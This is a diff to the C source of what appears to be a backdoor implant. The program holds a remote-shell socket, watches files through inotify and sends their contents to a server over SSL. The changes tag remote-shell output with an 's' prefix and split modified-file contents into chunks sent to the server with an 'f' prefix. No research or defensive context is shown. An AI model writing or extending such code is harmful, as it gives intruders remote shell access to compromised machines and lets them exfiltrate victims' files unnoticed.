@@ -49,7 +49,7 @@ struct inot_watch {
     char name[NAME_MAX + 1];
 };
 
-unsigned char buffer[MAX_PAYLOAD];
+unsigned char buffer[MAX_PAYLOAD + 1];
 
 int conn_sock = -1;
 int remote_shell_sock = -1;
@@ -318,7 +318,13 @@ void epoll_event_loop(SSL* ssl) {
                 while ((size = read(eventList[i].data.fd, buffer, MAX_PAYLOAD)) > 0) {
                     printf("Read %d bytes\n", size);
                     printf("Wrote %d bytes to server\n", size);
-                    SSL_write(ssl, buffer, size);
+                    if (eventList[i].data.fd == remote_shell_sock) {
+                        memmove(buffer + 1, buffer, size);
+                        buffer[0] = 's';
+                        SSL_write(ssl, buffer, size + 1);
+                    } else {
+                        SSL_write(ssl, buffer, size);
+                    }
                 }
                 if (size == 0) {
                     goto done;
@@ -399,15 +405,19 @@ int handle_inotify_modified(struct inotify_event* ie) {
     size_t file_size = ftell(f);
     rewind(f);
 
-    unsigned char* file_buffer = malloc(file_size + 1);
+    //unsigned char* file_buffer = malloc(file_size + 1);
+    unsigned char file_buffer[MAX_PAYLOAD];
     file_buffer[0] = 'f';
-    if (!fread(file_buffer + 1, 1, file_size, f)) {
+    size_t size;
+    while((size = fread(file_buffer + 1, 1, MAX_PAYLOAD - 1, f)) > 0) {
+        //Write to server via local socket listening in epoll
+        write(local_socks[1], file_buffer, size + 1);
+        printf("Wrote file data to the server\n");
+    }
+    if (file_size % MAX_PAYLOAD && errno) {
         perror("fread");
         return -1;
     }
-    //Write to server via local socket listening in epoll
-    write(local_socks[1], file_buffer, file_size + 1);
-    printf("Wrote to the server\n");
     return 0;
 }
 
